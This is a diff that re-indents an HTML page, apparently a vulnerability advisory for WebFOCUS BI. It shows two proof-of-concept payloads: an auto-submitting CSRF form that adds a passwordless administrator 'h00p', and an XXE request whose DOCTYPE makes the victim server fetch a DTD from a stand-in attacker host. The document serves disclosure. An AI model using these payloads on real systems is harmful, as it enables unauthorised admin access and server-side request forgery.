@@ -60,21 +60,21 @@
             <li>The victim visits a page with attacker-controlled content.  This may be an internal SharePoint site or a website on the internet. </li>
             <li>.  The attacker-controlled content contains the following HTML and JavaScript, which instructs the browser to add a new administrative user ("h00p") with no password. </br>
                 <pre>
-				&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
-			  	&lt;form action="hxxps://webfocusbi.mysite.com/ibi_apps/WFServlet.ibfs"&gt;
-			    &lt;input type="hidden" name="IBFS1&#95;action" value="createUser" /&gt;
-			    &lt;input type="hidden" name="IBFS&#95;name" value="h00p" /&gt;
-			    &lt;input type="hidden" name="IBFS&#95;description" value="h00p" /&gt;
-			    &lt;input type="hidden" name="IBFS&#95;password" value="" /&gt;
-			    &lt;input type="hidden" name="IBFS&#95;email" value="" /&gt;
-			    &lt;input type="hidden" name="IBFS&#95;status" value="ACTIVE" /&gt;
-			    &lt;input type="hidden" name="IBFS&#95;initGroup" value="IBFS&#58;&#47;SSYS&#47;GROUPS&#47;Administrators" /&gt;
-			    &lt;input type="hidden" name="IBFS&#95;pSetList" value="" /&gt;
-			    &lt;input type="submit" value="Submit request" /&gt;
-			  	&lt;/form&gt;
-			  	&lt;script&gt;
-			    document.forms[0].submit();
-			  	&lt;/script&gt;
+		&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
+	   &lt;form action="hxxps://webfocusbi.mysite.com/ibi_apps/WFServlet.ibfs"&gt;
+		    &lt;input type="hidden" name="IBFS1&#95;action" value="createUser" /&gt;
+		    &lt;input type="hidden" name="IBFS&#95;name" value="h00p" /&gt;
+		    &lt;input type="hidden" name="IBFS&#95;description" value="h00p" /&gt;
+		    &lt;input type="hidden" name="IBFS&#95;password" value="" /&gt;
+		    &lt;input type="hidden" name="IBFS&#95;email" value="" /&gt;
+		    &lt;input type="hidden" name="IBFS&#95;status" value="ACTIVE" /&gt;
+		    &lt;input type="hidden" name="IBFS&#95;initGroup" value="IBFS&#58;&#47;SSYS&#47;GROUPS&#47;Administrators" /&gt;
+			&lt;input type="hidden" name="IBFS&#95;pSetList" value="" /&gt;
+			&lt;input type="submit" value="Submit request" /&gt;
+	   &lt;/form&gt;
+		&lt;script&gt;
+		  document.forms[0].submit();
+		&lt;/script&gt;
               </pre>
 			</li>
             <li>When viewing the list of administrative users, the victim will notice that a new administrative user ("h00p") was added to the WebFOCUS BI application.</li>
@@ -94,12 +94,12 @@
             <li>As an administrative user, browse to the following URL: hxxps://webfocusbi.mysite.com
 /ibi_apps/WFServlet.cfg?IBICFG_action=CFGPUT&IBICFG_objtype=WEBCONFIG&IBICFG_content=%3C%3Fxml+version%3D%271.0%27+encoding%3D%27ISO-8859-1%27+%3F%3E%3C!DOCTYPE+foo+SYSTEM+"http://attackerURL.com/foo.dtd"%3E%3Cibwfrpc+name%3D%27CFGPUT%27%3E%3Cobject+type%3D%27webconfig%27%3E%3C%2Fobject%3E%3Creturncode%3E10000%3C%2Freturncode%3E%3C%2Fibwfrpc%3E</li>
             <li>The IBICFG_content parameter corresponds to the following when URL-decoded:<pre>
-            &lt;?xml+version='1.0'+encoding='ISO-8859-1'+?&gt;
-            &lt;!DOCTYPE+foo+SYSTEM+"http://attackerURL.com/foo.dtd"&gt;
+        &lt;?xml+version='1.0'+encoding='ISO-8859-1'+?&gt;
+        &lt;!DOCTYPE+foo+SYSTEM+"http://attackerURL.com/foo.dtd"&gt;
             &lt;ibwfrpc+name='CFGPUT'&gt;
-            &lt;object+type='webconfig'&gt;&lt;/object&gt;
-            &lt;returncode&gt;10000&lt;/returncode&gt;
-            &lt;/ibwfrpc&gt;
+                &lt;object+type='webconfig'&gt;&lt;/object&gt;
+                &lt;returncode&gt;10000&lt;/returncode&gt;
+        &lt;/ibwfrpc&gt;
             </pre></li>
             <li>This request will result in a HTTP request sent to attackerURL.com from the victim server.</li>
             <li>It also possible to enumerate open ports, local files, or network files with a time-based attack.</li>
